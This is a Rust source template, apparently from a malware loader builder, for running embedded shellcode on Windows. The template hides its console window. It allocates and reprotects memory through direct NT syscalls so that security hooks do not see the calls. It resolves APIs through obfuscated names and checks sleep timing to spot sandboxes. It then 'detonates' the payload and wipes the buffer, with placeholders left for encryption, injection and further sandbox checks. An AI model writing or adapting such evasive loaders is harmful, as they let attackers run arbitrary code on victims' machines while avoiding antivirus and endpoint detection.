#![windows_subsystem = "windows"]
#![allow(non_snake_case, unused_imports, unused_unsafe)]

use std::include_bytes;
use std::ptr::null_mut;
use std::time::Instant;

use winapi::ctypes::c_void;

use windows_sys::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
};

use dyncvoke::dyncvoke_core::syscall;

{{IMPORTS}}

{{SANDBOX_IMPORTS}}

unsafe fn syscall_alloc_exec(bytes: &[u8]) -> *mut c_void {
    let h_proc: *mut c_void = -1isize as *mut c_void;

    let mut base: *mut c_void = null_mut();
    let mut size: usize = bytes.len();
    let status = syscall!(
        "NtAllocateVirtualMemory",
        h_proc,
        &mut base as *mut *mut c_void,
        0usize,
        &mut size as *mut usize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    ).unwrap_or(-1);
    if status < 0 || base.is_null() { return null_mut(); }

    std::ptr::copy_nonoverlapping(bytes.as_ptr(), base as *mut u8, bytes.len());

    let mut old_protect: u32 = 0;
    let mut psize: usize = bytes.len();
    let status = syscall!(
        "NtProtectVirtualMemory",
        h_proc,
        &mut base as *mut *mut c_void,
        &mut psize as *mut usize,
        PAGE_EXECUTE_READ,
        &mut old_protect as *mut u32
    ).unwrap_or(-1);
    if status < 0 { return null_mut(); }

    base
}

{{INJECTION_HELPERS}}

{{DECRYPTION_FUNCTION}}

{{STR_DECODER}}

{{API_RESOLVER}}

const OBF_H: &[u8] = &{{OBF_NT_DELAY_EXECUTION}};
static OBF_NTDLL_SHORT: &[u8] = &{{STR_NTDLL_SHORT}};

type FH = unsafe extern "system" fn(u32, *const i64) -> i32;

fn {{FN_PAUSE}}(ms: i64) {
    unsafe {
        let f: FH = match {{FN_RESOLVER}}(OBF_NTDLL_SHORT, OBF_H) {
            Some(f) => f,
            None => return,
        };
        let interval: i64 = -(ms * 10_000);
        f(0, &interval);
    }
}

fn check_environment() -> bool {
    let start = Instant::now();
    {{FN_PAUSE}}(3000);
    start.elapsed().as_millis() >= 2500
}

fn wipe(buf: &mut Vec<u8>) {
    for b in buf.iter_mut() {
        unsafe { std::ptr::write_volatile(b as *mut u8, 0); }
    }
    buf.clear();
}

fn detonate(mut vec: Vec<u8>) {
    {{NT_DELAY_STEP}}
    {{FN_PAUSE}}({{JITTER_4}});
    {{NT_DELAY_FINAL}}

    unsafe {
        {{CALLBACK_INVOKE}}
    }

    wipe(&mut vec);
}

fn main() {
    {{NT_DELAY_AT_START}}
    {{SANDBOX}}

    if !check_environment() { return; }

    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    let mut vec: Vec<u8> = buf.to_vec();

    {{MAIN}}

    detonate(vec);
}

{{DLL_MAIN}}
